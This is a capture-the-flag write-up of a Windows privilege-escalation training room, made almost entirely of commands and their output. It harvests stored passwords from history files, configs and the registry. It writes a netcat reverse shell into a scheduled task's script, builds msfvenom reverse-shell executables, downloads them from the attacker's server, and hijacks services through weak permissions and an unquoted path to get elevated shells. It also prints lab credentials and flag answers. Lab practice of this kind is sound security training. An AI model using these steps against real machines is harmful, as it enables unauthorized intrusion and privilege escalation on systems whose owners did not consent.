# Room Information

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Banner%20-%20Windows%20Privilege%20Escalation.png)

Room link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 08/11/2023

# Room Tasks

## Harvesting Passwords From Usual Spots
```PowerShell
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
```

```PowerShell
C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

```PowerShell
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```

```PowerShell
C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
```

```PowerShell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>cd C:\
```

```PowerShell
C:\>dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\mike.katz\Desktop

05/04/2022  05:17 AM                24 flag.txt
               1 File(s)             24 bytes

     Total Files Listed:
               1 File(s)             24 bytes
               0 Dir(s)  14,781,849,600 bytes free
```

```PowerShell
C:\>type C:\Users\mike.katz\Desktop\flag.txt
THM{WHAT_IS_MY_PASSWORD}
```

```PowerShell
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```

## Other Quick Wins

1. Started this task's machine
2. `schtasks /query /tn <TASK NAME> /fo list /v` from the compromised Windows machine to query our target task's information and verbosely output the received data in a list format
```PowerShell
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/21/2023 10:25:35 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

3. `icacls <BINARY FILE PATH>` from the compromised Windows machine to view the DACLs (Discretionary Access Control Lists) for our target task's "Task To Run" executable
```PowerShell
C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

4. `echo <NETCAT EXECUTABLE PATH> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER> > <BINARY FILE PATH>` to append a netcat command that will connect back to a reverse shell listener that we'll set up on our Linux attack machine, to the target task's "Task To Run" executable
```PowerShell
C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.161.55 9999 > C:\tasks\schtask.bat
```

5. `nc -lvnp <PORT NUMBER` from our Linux attack machine, we'll open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-161-55:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

6. `schtasks /run /tn <TASK NAME>` from the compromised Windows machine to run our target task, which should end up executing the netcat command that we appended onto the task's executable file and spawning a reverse shell that connects back to our netcat listener that we had previously set up on our Linux attack machine
```PowerShell
C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.193.168 49866 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

7. `cd <ROOT DIRECTORY` from our reverse shell to change to the compromised Windows machine's root directory, from where we'll look for the text file containing this task's flag
```PowerShell
C:\Windows\system32>cd C:\
cd C:\
```

8. `dir /s <FILENAME>` from our reverse shell to recursively search for the text file containing this task's flag
```PowerShell
C:\>dir /s flag.txt
dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1\Desktop

05/03/2022  01:00 PM                19 flag.txt
               1 File(s)             19 bytes

     Total Files Listed:
               1 File(s)             19 bytes
               0 Dir(s)  15,037,288,448 bytes free
```

9. `cat <FILE LOCATION>` from our reverse shell to display the contents of the text file containing this task's flag
```PowerShell
C:\>type C:\Users\taskusr1\Desktop\flag.txt
type C:\Users\taskusr1\Desktop\flag.txt
THM{TASK_COMPLETED}
```


**TASK COMPLETED!**

## Abusing Service Misconfigurations

### Insecure Permissions on Service Executable

```PowerShell
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01  766k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,788,710,400 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
        1 file(s) moved.
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,779,236,352 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\ReverseShell.exe WService.exe
        1 file(s) moved.
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
08/04/2023  03:56 PM            48,640 WService.exe
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              39 File(s)     11,193,573 bytes
               3 Dir(s)  14,755,926,016 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>sc stop WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>sc start WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.124.176 49783 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\svcusr1\Desktop\flag.txt     
type C:\Users\svcusr1\Desktop\flag.txt
THM{AT_YOUR_SERVICE}
```

### Unquoted Service Paths

```PowerShell
C:\Users\thm-unpriv>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1484k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\Users\thm-unpriv>move C:\Users\thm-unpriv\ReverseShell.exe C:\MyPrograms\Disk.exe
        1 file(s) moved.
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
processed file: C:\MyPrograms\Disk.exe
Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```Powershell
C:\Users\thm-unpriv>sc stop "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```PowerShell
C:\Users\thm-unpriv>sc start "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 936
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49761 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\svcusr2\Desktop\flag.txt
type C:\Users\svcusr2\Desktop\flag.txt
THM{QUOTES_EVERYWHERE}
```

### Insecure Service Permissions

```PowerShell
C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1532k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\ReverseShell.exe /grant Everyone:F
processed file: C:\Users\thm-unpriv\ReverseShell.exe
Successfully processed 1 files; Failed processing 0 files
```

```PowerShell
C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```PowerShell
C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.
```

```PowerShell
C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3884
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49902 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
THM{INSECURE_SVC_CONFIG}
```


## Abusing Dangerous Privileges


## Abusing Vulnerable Software


## Tools of the Trade


